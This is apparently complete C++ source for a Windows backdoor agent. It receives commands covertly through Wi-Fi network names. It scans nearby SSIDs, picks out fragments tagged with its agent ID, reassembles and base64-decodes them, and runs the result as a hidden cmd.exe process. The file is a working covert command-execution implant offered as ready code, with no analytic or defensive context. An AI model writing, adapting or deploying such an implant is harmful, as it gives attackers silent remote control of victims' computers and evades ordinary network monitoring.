#include <windows.h>
#include <wlanapi.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <map>
#include <iostream>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")

// CONFIGURATION
const std::string TAG = "RX:";

struct CommandFragment {
    std::string agent_id;
    std::string job_id;
    int index;
    int total;
    std::string data;
};

// --- BASE64 HELPER ---
std::string Base64Decode(std::string encoded) {
    DWORD decodedLen = 0;
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL)) return "";
    std::vector<BYTE> buffer(decodedLen);
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, &buffer[0], &decodedLen, NULL, NULL)) return "";
    return std::string(buffer.begin(), buffer.end());
}

// --- PARSER ---
bool ParseSSID(std::string ssid, std::string my_id, CommandFragment& frag) {
    // Protocol: RX:AGENT_ID:JOB_ID:INDEX/TOTAL:DATA
    if (ssid.find(TAG) != 0) return false;

    try {
        // 1. Extract Agent ID
        size_t id_start = 3; // Length of "RX:"
        size_t id_end = ssid.find(':', id_start);
        if (id_end == std::string::npos) return false;

        frag.agent_id = ssid.substr(id_start, id_end - id_start);

        // ** CRITICAL FILTER **
        if (frag.agent_id != my_id) return false;

        // 2. Extract Job ID
        size_t job_end = ssid.find(':', id_end + 1);
        if (job_end == std::string::npos) return false;
        frag.job_id = ssid.substr(id_end + 1, job_end - (id_end + 1));

        // 3. Extract Index/Total
        size_t slash = ssid.find('/', job_end);
        size_t data_start = ssid.find(':', slash);
        if (slash == std::string::npos || data_start == std::string::npos) return false;

        std::string s_idx = ssid.substr(job_end + 1, slash - (job_end + 1));
        std::string s_tot = ssid.substr(slash + 1, data_start - (slash + 1));

        frag.index = std::stoi(s_idx);
        frag.total = std::stoi(s_tot);
        frag.data = ssid.substr(data_start + 1);

        return true;
    }
    catch (...) {
        return false;
    }
}

void RunSilent(std::string cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // CRITICAL: Hides the window

    ZeroMemory(&pi, sizeof(pi));

    // Prefix with cmd.exe /c to run shell commands
    std::string full_cmd = "cmd.exe /c " + cmd;

    if (CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Close handles immediately to avoid leaks (we don't wait for it)
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// --- MAIN ---
int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("[!] Usage: %s <MY_AGENT_ID>\n", argv[0]);
        printf("[!] Example: %s AGT01\n", argv[0]);
        return 1;
    }

    std::string my_agent_id = argv[1];
    printf("[*] Agent Online. Identity: %s\n", my_agent_id.c_str());
    printf("[*] Scanning all channels (OS Managed)...\n");

    // SETUP WLAN
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (pIfList->dwNumberOfItems == 0) return 1;
    GUID pInterfaceGuid = pIfList->InterfaceInfo[0].InterfaceGuid;

    // MEMORY
    std::vector<std::string> job_history;
    std::map<std::string, std::map<int, std::string>> job_buffers;
    std::map<std::string, int> job_totals;

    while (true) {
        printf("."); // Heartbeat
        WlanScan(hClient, &pInterfaceGuid, NULL, NULL, NULL);
        Sleep(4000); // Wait for OS scan to complete

        PWLAN_BSS_LIST pBssList = NULL;
        if (WlanGetNetworkBssList(hClient, &pInterfaceGuid, NULL, dot11_BSS_type_any, FALSE, NULL, &pBssList) == ERROR_SUCCESS) {

            for (unsigned int i = 0; i < pBssList->dwNumberOfItems; i++) {
                char ssidBuffer[33] = { 0 };
                memcpy(ssidBuffer, pBssList->wlanBssEntries[i].dot11Ssid.ucSSID, pBssList->wlanBssEntries[i].dot11Ssid.uSSIDLength);
                std::string ssid(ssidBuffer);

                CommandFragment frag;
                if (ParseSSID(ssid, my_agent_id, frag)) {

                    // Check History
                    bool already_done = false;
                    for (const auto& done_job : job_history) {
                        if (done_job == frag.job_id) already_done = true;
                    }
                    if (already_done) continue;

                    // Store Fragment
                    job_buffers[frag.job_id][frag.index] = frag.data;
                    job_totals[frag.job_id] = frag.total;
                }
            }
        }

        // Execution Check
        auto it = job_buffers.begin();
        while (it != job_buffers.end()) {
            std::string j_id = it->first;

            if (it->second.size() == job_totals[j_id]) {
                // Reassemble
                std::string full_b64 = "";
                for (int i = 1; i <= job_totals[j_id]; i++) full_b64 += it->second[i];

                std::string cmd = Base64Decode(full_b64);

                printf("\n[+] Job %s Triggered!\n", j_id.c_str());
                printf("[+] Executing: %s\n", cmd.c_str());

                RunSilent(cmd.c_str());

                // Archive Job
                job_history.push_back(j_id);

                // Erase from buffer
                it = job_buffers.erase(it);
            }
            else {
                ++it;
            }
        }

        if (pBssList != NULL) WlanFreeMemory(pBssList);
        Sleep(500);
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    return 0;
}